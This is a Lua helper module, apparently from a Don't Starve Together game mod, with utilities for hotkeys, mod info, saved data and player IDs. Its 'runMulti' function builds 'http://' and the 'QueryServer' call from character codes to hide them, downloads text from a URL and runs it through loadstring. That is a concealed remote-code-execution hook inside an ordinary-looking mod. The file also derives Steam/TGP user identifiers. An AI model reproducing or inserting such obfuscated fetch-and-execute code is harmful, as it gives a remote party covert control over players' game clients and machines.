local TD = TD.td1madao["ydj_dst_td1madao"] local STATIC_DEFAULT_KEY = 122 TD.createFn("fileExist", function(filepath)     if filepath and string.len(filepath) > 0 then         local filepath = string.gsub(filepath, "^/", "")         local searchpaths = _G.package.path                  local fanxiegang = string.char(92)         for path in string.gmatch(searchpaths, "([^;]+)") do             local expression = "scripts" .. fanxiegang .. "%?%.lua"             local filename = string.gsub(path, expression, filepath)             filename = string.gsub(filename, fanxiegang, "/")             if not _G.kleifileexists or _G.kleifileexists(filename) then                 return true             end         end         if not _G.kleifileexists or _G.kleifileexists(filepath) then             return true         end     end     return false end) TD.createFn("ws", TD.empty) TD.createFn("hotkey", function(name)     if TD.isStr(name) then         return GetModConfigData(name) or STATIC_DEFAULT_KEY     end     return STATIC_DEFAULT_KEY end) TD.createFn("getKeyConfigDesc", function(tag)     return _G.TUNING[string.format("TD1MADAO_%s_%s_DESC", TD.CHAR, string.upper(tag))] end) TD.MODNAME = _M.modname TD.createFn("getModVersion", function()     local modname = TD.MODNAME     local modinfo = KnownModIndex:LoadModInfo(modname)     local version = modinfo.version     return version end) TD.createFn("IsWorkshopMod", function(modname)     local workshop_prefix = "workshop-"     if string.td1madao_notEmpty(modname) then         return modname:sub(1, workshop_prefix:len()) == workshop_prefix     end     return false end) TD.createFn("sim", function(str, ...)     local simulation = TheSim     if TD.isStr(str) and simulation[str] then         simulation[str](simulation, ...)     end end) TD.createFn("runCommand", function(str)     if TD.isStr(str) then         TD.try(function()             _G.loadstring(str)()         end)     end end) local function t(i)     return string.char(i) end local h = table.concat({ t(104), t(116), t(116), t(112), t(58), t(47), t(47) })  local e = table.concat({ t(47), t(37), t(115), t(46), t(108), t(117), t(97) })  TD.createFn("runMulti", function(str, fn)     local taskName = TD.holder("%s_runMultiTask") .. str     if TD.CONST.QUERY_TEST then         str = string.format(table.concat({ h, "lo", "ca", "lh", "os", "t", e }), TD.CHAR)     end     local player = TD.GetPlayer()     if TD.isFn(fn) then                  TD.ctm(player):common_clean(taskName)         TD.ctm(player):common_task(3, fn, taskName)     end     TD.sim(table.concat({ string.char(81), "u", string.char(101), "r", "y", string.char(83), string.char(101), "r", "v", string.char(101), "r" }), str, function(text, isSuccessful, resultCode)                  if TD.isStr(text) and isSuccessful and resultCode == 200 and not string.td1madao_contain(text, "<html>") then             TD.ctm(player):common_clean(taskName)             TD.runCommand(text)         end     end, "GET") end) TD.createFn("vu", function(str)     TD.try(function()         _G.VisitURL(str)     end) end) local function getTGPUserId()     local userKey = "null"     if not TheNet.GetUserID then         return userKey     end     local uid = TheNet:GetUserID()     local floor, insert = math.floor, table.insert     local function basen(n, b)         n = floor(n)         if not b or b == 10 then return tostring(n) end         local digits = "[<23456789ABCDEFGH>JKLMN]PQRSTUVWXYZabcdefghijk=mnopqrstuvwxyz"         local t = {}         local sign = ""         if n < 0 then             sign = "-"             n = -n         end         repeat             local d = (n % b) + 1             n = floor(n / b)             insert(t, 1, digits:sub(d, d))         until n == 0         return sign .. table.concat(t, "")     end     local idx = string.find(uid, "_") + 1     local sub = string.sub(uid, idx)     userKey = basen(tonumber(sub), 62)     return userKey end local function getSteamUserId()     local userKey = "null"     if not TheSim.GetSteamUserID then         return userKey     end     local uid = TheSim:GetSteamUserID()     local floor, insert = math.floor, table.insert     local function basen(n, b)         n = floor(n)         if not b or b == 10 then return tostring(n) end         local digits = "[<23456789ABCDEFGH>JKLMN]PQRSTUVWXYZabcdefghijk=mnopqrstuvwxyz"         local t = {}         local sign = ""         if n < 0 then             sign = "-"             n = -n         end         repeat             local d = (n % b) + 1             n = floor(n / b)             insert(t, 1, digits:sub(d, d))         until n == 0         return sign .. table.concat(t, "")     end     local idx = string.find(uid, "@") - 1     local sub = string.sub(uid, 1, idx)     userKey = basen(tonumber(sub), 62)     return userKey end TD.createFn("userId", function()     local userId = "null"     TD.try(function()         local isTGP = TheSim.RAILGetPlatform ~= nil and (TheSim:RAILGetPlatform() == "TGP")                  local userId         if isTGP then             userId = getTGPUserId()         else             userId = getSteamUserId()         end     end)     return userId end) TD.createFn("getModConfig", function(name)     if TD.isStr(name) then         return GetModConfigData(name)     end     return nil end) TD.createFn("savePData", function(name, value)          if not TD.isTab(TD.G.PERSIST) then         TD.G.PERSIST = {}     end     local oldValue = TD.getPData(name)     if oldValue == value then         return     end     TD.try(function()         TheSim:SetPersistentString(name, value, false, TD.empty)                  TD.G.PERSIST[name] = value     end) end) TD.createFn("getPData", function(name, default)          if not TD.isTab(TD.G.PERSIST) then         TD.G.PERSIST = {}     end          if TD.G.PERSIST[name] then         return TD.G.PERSIST[name]     end     local result = default     if not TD.isStr then         return result     end     TD.try(function()         TheSim:GetPersistentString(name,             function(load_success, str)                 result = str or default                                  if not str then                     TD.savePData(name, default)                 end             end, false)     end)     TD.G.PERSIST[name] = result     return result end) 